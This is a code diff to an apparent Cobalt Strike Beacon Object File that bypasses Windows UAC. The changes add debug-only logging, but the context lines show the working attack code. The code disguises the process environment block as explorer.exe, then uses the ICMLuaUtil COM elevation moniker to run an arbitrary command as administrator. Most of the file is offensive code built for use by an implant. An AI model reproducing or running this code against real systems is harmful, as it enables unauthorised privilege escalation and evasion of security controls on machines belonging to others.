@@ -144,6 +144,13 @@
 #pragma comment(lib, "ntoskrnl.lib")
 
 /**
+ * If debug is enabled
+ */
+#ifndef DEBUG
+    #define DEBUG 0
+#endif
+
+/**
  * ICMLuaUtil VTBL interface
  */
 typedef interface ICMLuaUtil ICMLuaUtil;
@@ -174,25 +181,41 @@ interface ICMLuaUtil {
  */
 #ifdef BOF
     #define PRINT(...) { \
-         BeaconPrintf(CALLBACK_OUTPUT, __VA_ARGS__); \
+        BeaconPrintf(CALLBACK_OUTPUT, __VA_ARGS__); \
     }
 #else
     #define PRINT(...) { \
-         fprintf(stdout, "[+] "); \
-         fprintf(stdout, __VA_ARGS__); \
-         fprintf(stdout, "\n"); \
+        fprintf(stdout, "[+] "); \
+        fprintf(stdout, __VA_ARGS__); \
+        fprintf(stdout, "\n"); \
     }
 #endif
 
 #ifdef BOF
     #define PRINT_ERROR(...) { \
-         BeaconPrintf(CALLBACK_ERROR, __VA_ARGS__); \
+        BeaconPrintf(CALLBACK_ERROR, __VA_ARGS__); \
     }
 #else
     #define PRINT_ERROR(...) { \
-         fprintf(stdout, "[!] "); \
-         fprintf(stdout, __VA_ARGS__); \
-         fprintf(stdout, "\n"); \
+        fprintf(stdout, "[!] "); \
+        fprintf(stdout, __VA_ARGS__); \
+        fprintf(stdout, "\n"); \
+    }
+#endif
+
+#ifdef BOF
+    #define PRINT_DEBUG(...) { \
+        if (DEBUG) { \
+            BeaconPrintf(CALLBACK_OUTPUT, __VA_ARGS__); \
+        } \
+    }
+#else
+    #define PRINT_DEBUG(...) { \
+        if (DEBUG) { \
+            fprintf(stdout, "[i] "); \
+            fprintf(stdout, __VA_ARGS__); \
+            fprintf(stdout, "\n"); \
+        } \
     }
 #endif
 
@@ -217,7 +240,7 @@ void* NtGetPeb() {
  * @return int Zero if succesfully executed, any other integer otherwise.
  */
 int masqueradePEB() {
-    PRINT("\t- Defining local structs.");
+    PRINT_DEBUG("\t- Defining local structs.");
 
     /**
      * Define local PEB LDR DATA
@@ -332,19 +355,19 @@ int masqueradePEB() {
         return 1;
     }
 
-    PRINT("\t- Getting 'explorer.exe' path.");
+    PRINT_DEBUG("\t- Getting 'explorer.exe' path.");
     WCHAR chExplorerPath[MAX_PATH];
     GetWindowsDirectoryW(chExplorerPath, MAX_PATH);
     wcscat_s(chExplorerPath, sizeof(chExplorerPath) / sizeof(wchar_t), L"\\explorer.exe");
     LPWSTR pwExplorerPath = (LPWSTR) malloc(MAX_PATH);
     wcscpy_s(pwExplorerPath, MAX_PATH, chExplorerPath);
 
-    PRINT("\t- Getting current PEB.");
+    PRINT_DEBUG("\t- Getting current PEB.");
     PEB* peb = (PEB*) NtGetPeb();
 
     RtlEnterCriticalSection(peb->FastPebLock);
 
-    PRINT("\t- Masquerading ImagePathName and CommandLine.");
+    PRINT_DEBUG("\t- Masquerading ImagePathName and CommandLine.");
 
     RtlInitUnicodeString(&peb->ProcessParameters->ImagePathName, chExplorerPath);
     RtlInitUnicodeString(&peb->ProcessParameters->CommandLine, chExplorerPath);
@@ -357,7 +380,7 @@ int masqueradePEB() {
 
     do {
         if (_wcsicmp(wExeFileName, pNextModuleInfo->FullDllName.Buffer) == 0) {
-            PRINT("\t- Masquerading FullDllName and BaseDllName.");
+            PRINT_DEBUG("\t- Masquerading FullDllName and BaseDllName.");
             RtlInitUnicodeString(&pNextModuleInfo->FullDllName, pwExplorerPath);
             RtlInitUnicodeString(&pNextModuleInfo->BaseDllName, pwExplorerPath);
             break;
@@ -399,24 +422,24 @@ int invokeComElevation(char* file, char* parameters) {
     ICMLuaUtil* pICMLuaUtil = NULL;
 
     do {
-        PRINT("\t- IIDFromString.");
+        PRINT_DEBUG("\t- IIDFromString.");
         IID hIID_ICMLuaUtil;
         if (IIDFromString(L"{6EDD6D74-C007-4E75-B76A-E5740995E24C}", &hIID_ICMLuaUtil) != S_OK) {
             PRINT_ERROR("Could not get IID from ICMLuaUtil GUID.");
             break;
         }
 
-        PRINT("\t- Initializing BIND_OPTS3.");
+        PRINT_DEBUG("\t- Initializing BIND_OPTS3.");
         BIND_OPTS3 hBindOpts;
         memset(&hBindOpts, 0, sizeof(hBindOpts));
 
         hBindOpts.cbStruct = sizeof(hBindOpts);
         hBindOpts.dwClassContext = CLSCTX_LOCAL_SERVER;
 
-        PRINT("\t- CoInitialize.");
+        PRINT_DEBUG("\t- CoInitialize.");
         CoInitialize(NULL);
 
-        PRINT("\t- CoGetObject.");
+        PRINT_DEBUG("\t- CoGetObject.");
         hResult = CoGetObject(L"Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}", (BIND_OPTS*) &hBindOpts, &hIID_ICMLuaUtil, (void**) &pICMLuaUtil);
         if (hResult != S_OK) {
             PRINT_ERROR("\t- Could not perform CoGetObject: %x, %s.\n", hResult, StringFromResult(hResult));
@@ -438,7 +461,7 @@ int invokeComElevation(char* file, char* parameters) {
             break;
         }
 
-        PRINT("\t- Succesfully executed shell.");
+        PRINT_DEBUG("\t- Succesfully executed shell.");
     } while (false);
 
     if (pICMLuaUtil != NULL) {
@@ -461,7 +484,7 @@ int boot(char* file, char* parameters) {
         return 1;
     }
 
-    PRINT("Trying command %s %s.", file, parameters);
+    PRINT("Command: %s %s", file, parameters);
 
     PRINT("Masquerading PEB.");
     if (masqueradePEB() != 0) {
@@ -523,7 +546,7 @@ int boot(char* file, char* parameters) {
             strcat(parameters, argv[index]);
             index ++;
         }
-        
+
         return boot(argv[1], parameters);
     }
 #endif
